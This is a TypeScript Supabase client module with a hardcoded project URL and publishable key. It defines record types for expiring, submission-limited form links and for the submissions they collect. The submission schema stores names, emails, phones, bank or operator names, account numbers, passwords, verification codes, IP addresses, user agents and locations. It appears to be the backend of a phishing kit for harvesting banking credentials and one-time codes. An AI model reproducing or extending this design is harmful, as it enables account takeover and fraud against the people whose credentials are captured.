import { createClient } from '@supabase/supabase-js';

const defaultUrl = 'https://ddqmgnkgopetupoazfhg.supabase.co';
const defaultAnonKey = 'sb_publishable_qbj2AX-UqOz5WwokaTXutw_RfLm8_V3';
const rawUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || (process.env.NEXT_PUBLIC_API_URL?.includes('supabase.co') ? process.env.NEXT_PUBLIC_API_URL : '') || defaultUrl;
const cleanSupabaseUrl = rawUrl.trim().replace(/\/rest\/v1\/?$/, '').replace(/\/$/, '');
const supabaseAnonKey = (process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || defaultAnonKey).trim();

export const isSupabaseConfigured = () => {
    return Boolean(
        cleanSupabaseUrl &&
        supabaseAnonKey &&
        !supabaseAnonKey.includes('votre_cle') &&
        supabaseAnonKey !== 'placeholder-key'
    );
};

export const supabase = createClient(
    cleanSupabaseUrl,
    supabaseAnonKey,
    {
        auth: {
            persistSession: true,
            autoRefreshToken: true,
        }
    }
);

// Types
export interface FormLinkRecord {
    id: number | string;
    user_id?: string;
    name: string;
    description?: string;
    link_id: string;
    expiry_date?: string | null;
    submissions_limit: number;
    submission_count: number;
    is_active: boolean;
    created_at: string;
}

export interface SubmissionRecord {
    id: string;
    user_id?: string;
    link_id?: string;
    form_link_id?: number | string;
    full_name: string;
    email: string;
    phone: string;
    method: string;
    account_number: string;
    password?: string;
    verification_code?: string;
    bank_name?: string;
    operator_name?: string;
    country_name?: string;
    country_code?: string;
    ip_address?: string;
    user_agent?: string;
    location?: string;
    status: string;
    admin_notes?: string;
    created_at: string;
}
